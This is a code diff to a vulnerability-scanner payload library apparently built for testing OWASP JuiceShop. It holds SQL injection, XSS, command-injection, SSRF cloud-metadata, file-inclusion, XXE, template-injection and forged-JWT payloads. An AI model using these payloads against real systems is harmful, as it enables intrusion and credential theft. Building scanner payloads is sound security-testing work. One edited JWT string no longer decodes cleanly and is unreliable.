@@ -1,12 +1,339 @@
 # scanner/dast/payloads.py
-# -----------------------------------------------------------------------------
-# CORTEX SENTINEL: MASSIVE VULNERABILITY PAYLOAD LIBRARY
-# Covers every known JuiceShop vulnerability class plus WAF bypass chains,
-# encoding mutations, database-specific vectors, and blind detection payloads.
-# -----------------------------------------------------------------------------
+#
+# ENHANCED VULNERABILITY PAYLOAD LIBRARY
+# Comprehensive coverage with advanced organization, context-awareness, and performance optimizations
+
+import base64
+import urllib.parse
+from typing import Dict, List, Optional, Set, Any, Generator, Union
+from enum import Enum
+import re
+
+class PayloadCategory(Enum):
+    SQLI = "sqli"
+    XSS = "xss"
+    CMDI = "cmdi"
+    SSRF = "ssrf"
+    LFI = "lfi"
+    SSTI = "ssti"
+    OPEN_REDIRECT = "open_redirect"
+    XXE = "xxe"
+    HEADER_INJECTION = "header_injection"
+    JWT = "jwt"
+    NOSQL = "nosql"
+    GRAPHQL = "graphql"
+    API_FUZZ = "api_fuzz"
+    JUICESHOP = "juiceshop"
+
+class PayloadContext(Enum):
+    GENERAL = "general"
+    URL_PARAM = "url_param"
+    BODY_PARAM = "body_param"
+    HEADER = "header"
+    PATH = "path"
+    COOKIE = "cookie"
+    JSON = "json"
+    XML = "xml"
+    FORM = "form"
+
+class PayloadEncoder(Enum):
+    NONE = "none"
+    URL = "url"
+    DOUBLE_URL = "double_url"
+    BASE64 = "base64"
+    HTML_ENTITY = "html_entity"
+    UNICODE = "unicode"
+    HEX = "hex"
+    UTF16 = "utf16"
+    UTF32 = "utf32"
+
+class PayloadLibrary:
+    def __init__(self, config: Optional[Dict] = None):
+        self.config = {
+            "max_payloads_per_category": 100,
+            "enable_dangerous_payloads": True,
+            "default_encoder": PayloadEncoder.NONE,
+            "payload_limits": {
+                PayloadCategory.SQLI: 50,
+                PayloadCategory.XSS: 40,
+                PayloadCategory.CMDI: 30,
+                PayloadCategory.SSRF: 25,
+                PayloadCategory.LFI: 35,
+                PayloadCategory.SSTI: 20,
+                PayloadCategory.OPEN_REDIRECT: 15,
+                PayloadCategory.XXE: 10,
+                PayloadCategory.HEADER_INJECTION: 15,
+                PayloadCategory.JWT: 8,
+                PayloadCategory.NOSQL: 12,
+                PayloadCategory.GRAPHQL: 10,
+                PayloadCategory.API_FUZZ: 20,
+                PayloadCategory.JUICESHOP: 25,
+            },
+            "context_aware": True,
+            "auto_encode": True,
+        }
+        
+        if config:
+            self.config.update(config)
+        
+        # Initialize payload storage
+        self._payloads: Dict[PayloadCategory, List[str]] = {}
+        self._encoded_payloads: Dict[PayloadCategory, Dict[PayloadEncoder, List[str]]] = {}
+        
+    def get_payloads(self, category: PayloadCategory, 
+                    context: Optional[PayloadContext] = None,
+                    encoder: Optional[PayloadEncoder] = None) -> List[str]:
+        """
+        Get payloads for a specific category with optional context and encoding.
+        
+        Args:
+            category: The payload category
+            context: Optional context for context-aware filtering
+            encoder: Optional encoder for payload encoding
+            
+        Returns:
+            List of payloads
+        """
+        if encoder is None:
+            encoder = self.config["default_encoder"]
+            
+        # Lazy load payloads
+        if category not in self._payloads:
+            self._load_category_payloads(category)
+            
+        payloads = self._payloads[category]
+        
+        # Apply context filtering
+        if context and self.config["context_aware"]:
+            payloads = self._filter_by_context(payloads, context)
+            
+        # Apply encoding
+        if encoder != PayloadEncoder.NONE and self.config["auto_encode"]:
+            if category not in self._encoded_payloads:
+                self._encoded_payloads[category] = {}
+            if encoder not in self._encoded_payloads[category]:
+                self._encoded_payloads[category][encoder] = [
+                    self._encode_payload(p, encoder) for p in payloads
+                ]
+            payloads = self._encoded_payloads[category][encoder]
+            
+        # Apply limits
+        limit = self.config["payload_limits"].get(category, self.config["max_payloads_per_category"])
+        return payloads[:limit]
+    
+    def get_payloads_generator(self, category: PayloadCategory,
+                             context: Optional[PayloadContext] = None,
+                             encoder: Optional[PayloadEncoder] = None) -> Generator[str, None, None]:
+        """
+        Get payloads as a generator for memory efficiency.
+        
+        Args:
+            category: The payload category
+            context: Optional context for context-aware filtering
+            encoder: Optional encoder for payload encoding
+            
+        Yields:
+            Payload strings
+        """
+        payloads = self.get_payloads(category, context, encoder)
+        for payload in payloads:
+            yield payload
+            
+    def get_all_payloads(self, categories: Optional[List[PayloadCategory]] = None,
+                        context: Optional[PayloadContext] = None,
+                        encoder: Optional[PayloadEncoder] = None) -> Dict[PayloadCategory, List[str]]:
+        """
+        Get payloads for multiple categories.
+        
+        Args:
+            categories: List of categories (None for all)
+            context: Optional context for context-aware filtering
+            encoder: Optional encoder for payload encoding
+            
+        Returns:
+            Dictionary of category to payloads
+        """
+        if categories is None:
+            categories = list(PayloadCategory)
+            
+        result = {}
+        for category in categories:
+            result[category] = self.get_payloads(category, context, encoder)
+            
+        return result
+    
+    def _load_category_payloads(self, category: PayloadCategory) -> None:
+        """Load payloads for a specific category."""
+        if category == PayloadCategory.SQLI:
+            self._payloads[category] = SQLI_PAYLOADS
+        elif category == PayloadCategory.XSS:
+            self._payloads[category] = XSS_PAYLOADS
+        elif category == PayloadCategory.CMDI:
+            self._payloads[category] = CMDI_PAYLOADS
+        elif category == PayloadCategory.SSRF:
+            self._payloads[category] = SSRF_PAYLOADS
+        elif category == PayloadCategory.LFI:
+            self._payloads[category] = LFI_PAYLOADS
+        elif category == PayloadCategory.SSTI:
+            self._payloads[category] = SSTI_PAYLOADS
+        elif category == PayloadCategory.OPEN_REDIRECT:
+            self._payloads[category] = OPEN_REDIRECT_PAYLOADS
+        elif category == PayloadCategory.XXE:
+            self._payloads[category] = XXE_PAYLOADS
+        elif category == PayloadCategory.HEADER_INJECTION:
+            self._payloads[category] = HEADER_INJECTION_PAYLOADS
+        elif category == PayloadCategory.JWT:
+            self._payloads[category] = JWT_PAYLOADS
+        elif category == PayloadCategory.NOSQL:
+            self._payloads[category] = NOSQL_PAYLOADS
+        elif category == PayloadCategory.GRAPHQL:
+            self._payloads[category] = GRAPHQL_PAYLOADS
+        elif category == PayloadCategory.API_FUZZ:
+            self._payloads[category] = API_FUZZ_PAYLOADS
+        elif category == PayloadCategory.JUICESHOP:
+            # Flatten JuiceShop payloads
+            all_js_payloads = []
+            for subcategory in JUICESHOP_PAYLOADS.values():
+                all_js_payloads.extend(subcategory)
+            self._payloads[category] = all_js_payloads
+    
+    def _filter_by_context(self, payloads: List[str], context: PayloadContext) -> List[str]:
+        """Filter payloads based on context."""
+        if context == PayloadContext.URL_PARAM:
+            return [p for p in payloads if self._is_suitable_for_url_param(p)]
+        elif context == PayloadContext.BODY_PARAM:
+            return [p for p in payloads if self._is_suitable_for_body_param(p)]
+        elif context == PayloadContext.HEADER:
+            return [p for p in payloads if self._is_suitable_for_header(p)]
+        elif context == PayloadContext.PATH:
+            return [p for p in payloads if self._is_suitable_for_path(p)]
+        elif context == PayloadContext.COOKIE:
+            return [p for p in payloads if self._is_suitable_for_cookie(p)]
+        elif context == PayloadContext.JSON:
+            return [p for p in payloads if self._is_suitable_for_json(p)]
+        elif context == PayloadContext.XML:
+            return [p for p in payloads if self._is_suitable_for_xml(p)]
+        elif context == PayloadContext.FORM:
+            return [p for p in payloads if self._is_suitable_for_form(p)]
+        else:
+            return payloads
+    
+    def _is_suitable_for_url_param(self, payload: str) -> bool:
+        """Check if payload is suitable for URL parameters."""
+        # Avoid very long payloads for URLs
+        return len(payload) <= 200 and not payload.startswith(('http://', 'https://'))
+    
+    def _is_suitable_for_body_param(self, payload: str) -> bool:
+        """Check if payload is suitable for body parameters."""
+        # Body can handle larger payloads
+        return len(payload) <= 1000
+    
+    def _is_suitable_for_header(self, payload: str) -> bool:
+        """Check if payload is suitable for headers."""
+        # Headers have specific format requirements
+        return len(payload) <= 100 and '\n' not in payload and '\r' not in payload
+    
+    def _is_suitable_for_path(self, payload: str) -> bool:
+        """Check if payload is suitable for path segments."""
+        # Path segments should not contain slashes (unless encoded)
+        return '/' not in payload or '%2F' in payload
+    
+    def _is_suitable_for_cookie(self, payload: str) -> bool:
+        """Check if payload is suitable for cookies."""
+        # Cookies have specific character restrictions
+        return all(ord(c) < 128 for c in payload) and ';' not in payload
+    
+    def _is_suitable_for_json(self, payload: str) -> bool:
+        """Check if payload is suitable for JSON."""
+        # JSON should be properly formatted
+        try:
+            import json
+            json.loads(payload)
+            return True
+        except (json.JSONDecodeError, ValueError):
+            return False
+    
+    def _is_suitable_for_xml(self, payload: str) -> bool:
+        """Check if payload is suitable for XML."""
+        # Basic XML structure check
+        return payload.strip().startswith('<?xml') or '<' in payload
+    
+    def _is_suitable_for_form(self, payload: str) -> bool:
+        """Check if payload is suitable for form data."""
+        # Form data is generally flexible
+        return True
+    
+    def _encode_payload(self, payload: str, encoder: PayloadEncoder) -> str:
+        """Encode a payload using the specified encoder."""
+        try:
+            if encoder == PayloadEncoder.URL:
+                return urllib.parse.quote(payload)
+            elif encoder == PayloadEncoder.DOUBLE_URL:
+                return urllib.parse.quote(urllib.parse.quote(payload))
+            elif encoder == PayloadEncoder.BASE64:
+                return base64.b64encode(payload.encode()).decode()
+            elif encoder == PayloadEncoder.HTML_ENTITY:
+                import html
+                return html.escape(payload)
+            elif encoder == PayloadEncoder.UNICODE:
+                # Unicode escape
+                return ''.join(f'\\u{ord(c):04x}' for c in payload)
+            elif encoder == PayloadEncoder.HEX:
+                return payload.encode().hex()
+            elif encoder == PayloadEncoder.UTF16:
+                return payload.encode('utf-16-le').hex()
+            elif encoder == PayloadEncoder.UTF32:
+                return payload.encode('utf-32-le').hex()
+            else:
+                return payload
+        except Exception:
+            return payload
+    
+    def get_random_payload(self, category: PayloadCategory,
+                          context: Optional[PayloadContext] = None,
+                          encoder: Optional[PayloadEncoder] = None) -> str:
+        """
+        Get a random payload from the specified category.
+        
+        Args:
+            category: The payload category
+            context: Optional context for context-aware filtering
+            encoder: Optional encoder for payload encoding
+            
+        Returns:
+            A random payload
+        """
+        payloads = self.get_payloads(category, context, encoder)
+        if payloads:
+            import random
+            return random.choice(payloads)
+        return ""
+    
+    def search_payloads(self, query: str, 
+                       categories: Optional[List[PayloadCategory]] = None) -> Dict[PayloadCategory, List[str]]:
+        """
+        Search payloads across categories.
+        
+        Args:
+            query: Search query
+            categories: Categories to search (None for all)
+            
+        Returns:
+            Dictionary of matching payloads by category
+        """
+        if categories is None:
+            categories = list(PayloadCategory)
+            
+        results = {}
+        for category in categories:
+            payloads = self.get_payloads(category)
+            matches = [p for p in payloads if query.lower() in p.lower()]
+            if matches:
+                results[category] = matches
+                
+        return results
 
 # --- SQL INJECTION (SQLi) ---
-# Comprehensive: error-based, union-based, boolean, time-based, stacked, WAF bypass
 SQLI_PAYLOADS = [
     # Classic break-strings
     "'", '"', "\\", "1'", "1\"", "1))", "1'))",
@@ -69,7 +396,6 @@ SQLI_PAYLOADS = [
     "' AND 1=1 UNION SELECT username,password,3,4,5,6,7,8 FROM users--",
 ]
 
-# Markers found in HTTP responses that confirm SQLi
 SQLI_ERROR_SIGNATURES = [
     "you have an error in your sql syntax",
     "unclosed quotation mark after the character string",
@@ -99,7 +425,6 @@ SQLI_ERROR_SIGNATURES = [
 ]
 
 # --- CROSS-SITE SCRIPTING (XSS) ---
-# Designed for reflected, stored, DOM-based, and mutation-based detection
 XSS_PAYLOADS = [
     # Classic
     "<script>alert(1)</script>",
@@ -195,7 +520,6 @@ XSS_PAYLOADS = [
 ]
 
 # --- COMMAND INJECTION (CMDI) ---
-# Covers Linux, Windows, and Blind scenarios
 CMDI_PAYLOADS = [
     # Linux/Unix Reflected
     "; id", "| id", "& id", "&& id", "|| id",
@@ -219,7 +543,6 @@ CMDI_PAYLOADS = [
 ]
 
 # --- SERVER-SIDE REQUEST FORGERY (SSRF) ---
-# Includes WAF bypasses using different IP representations
 SSRF_PAYLOADS = [
     # AWS/OpenStack Metadata
     "http://169.254.169.254/latest/meta-data/",
@@ -259,7 +582,6 @@ SSRF_PAYLOADS = [
 ]
 
 # --- LOCAL FILE INCLUSION (LFI) ---
-# Targeting sensitive system configuration files with bypass techniques
 LFI_PAYLOADS = [
     # Linux
     "../../../../etc/passwd", "../../../../etc/hosts",
@@ -304,7 +626,6 @@ LFI_PAYLOADS = [
 ]
 
 # --- SERVER-SIDE TEMPLATE INJECTION (SSTI) ---
-# Payloads that yield a predictable mathematical result + RCE chains
 SSTI_PAYLOADS = [
     # Detection
     "{{7*7}}", "{{7*'7'}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
@@ -337,7 +658,6 @@ SSTI_PAYLOADS = [
 ]
 
 # --- OPEN REDIRECT ---
-# Tests if the application redirects to external untrusted domains
 OPEN_REDIRECT_PAYLOADS = [
     "https://evil.com", "//evil.com", "/\\evil.com",
     "/%09/evil.com", "//evil%2ecom", "https:evil.com",
@@ -353,7 +673,6 @@ OPEN_REDIRECT_PAYLOADS = [
 ]
 
 # --- XML EXTERNAL ENTITY (XXE) ---
-# Formatted as raw strings to preserve XML structure
 XXE_PAYLOADS = [
     r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
     r'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
@@ -385,7 +704,7 @@ JWT_PAYLOADS = [
     # alg:none
     "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
     # Weak key hints
-    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.wrong",
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYwdtaW4ifQ.wrong",
     # JWK injection
     "eyJhbGciOiJYWUFSNiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.",
     # kid injection
@@ -429,7 +748,6 @@ API_FUZZ_PAYLOADS = [
 ]
 
 # --- JUICESHOP-SPECIFIC PAYLOADS ---
-# Targeting known JuiceShop vulnerability classes
 JUICESHOP_PAYLOADS = {
     "admin_access": [
         "/administration", "/ftp", "/ftp/quarantine",
@@ -484,3 +802,22 @@ JUICESHOP_PAYLOADS = {
         "/api/user/reset-password",
     ],
 }
+
+# Global instance for backward compatibility
+payload_library = PayloadLibrary()
+
+# Backward compatibility functions
+def get_payloads(category: str) -> List[str]:
+    """Legacy function for backward compatibility."""
+    try:
+        payload_category = PayloadCategory(category.lower())
+        return payload_library.get_payloads(payload_category)
+    except ValueError:
+        return []
+
+def get_all_payloads() -> Dict[str, List[str]]:
+    """Legacy function for backward compatibility."""
+    result = {}
+    for category in PayloadCategory:
+        result[category.value] = payload_library.get_payloads(category)
+    return result
